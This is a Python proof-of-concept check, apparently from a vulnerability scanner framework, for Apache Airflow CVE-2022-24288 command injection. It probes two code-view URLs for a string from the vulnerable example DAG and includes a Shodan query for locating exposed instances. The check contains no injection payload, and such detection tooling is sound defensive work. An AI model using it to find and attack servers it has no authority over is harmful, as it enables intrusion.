import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache Airflow CVE-2022-24288 OS Command Injection''',
        "description": '''In Apache Airflow, prior to version 2.2.4, some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI.''',
        "severity": "critical",
        "references": [
            "https://github.com/advisories/GHSA-3v7g-4pg3-7r6j"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "8.8",
            "cve-id": "CVE-2022-24288",
            "cwe-id": "CWE-78"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''title:"Airflow - DAGs"'''
        },
        "tags": ["cve", "cve2022", "airflow", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        paths = [
            "/admin/airflow/code?root=&dag_id=example_passing_params_via_test_command",
            "/code?dag_id=example_passing_params_via_test_command"
        ]
        for path in paths:
            resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
            if "foo was passed in via Airflow CLI Test command with value {{ params.foo }}" in resp.text:
                result["success"] = True
                result["info"] = info()
                result["payload"] = url+path

                return result

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url